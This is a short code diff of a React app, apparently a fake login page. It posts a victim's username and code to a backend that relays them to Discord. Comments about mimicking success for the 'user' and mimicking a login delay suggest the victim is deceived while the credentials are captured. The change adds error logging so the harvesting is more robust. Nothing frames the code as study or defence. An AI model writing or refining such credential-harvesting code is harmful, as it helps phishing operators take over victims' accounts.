@@ -115,13 +115,19 @@ export default function App() {
 
     try {
       // Send notification to Discord via our backend
-      await fetch("/api/notify", {
+      const response = await fetch("/api/notify", {
         method: "POST",
         headers: { "Content-Type": "application/json" },
         body: JSON.stringify({ username, code }),
       });
+
+      if (!response.ok) {
+        const errorData = await response.json();
+        console.error("Errore server:", errorData);
+        // We still proceed to mimic success for the "user" but we log the error
+      }
     } catch (error) {
-      console.error("Failed to notify Discord:", error);
+      console.error("Errore connessione API:", error);
     }
 
     // Mimic actual login delay
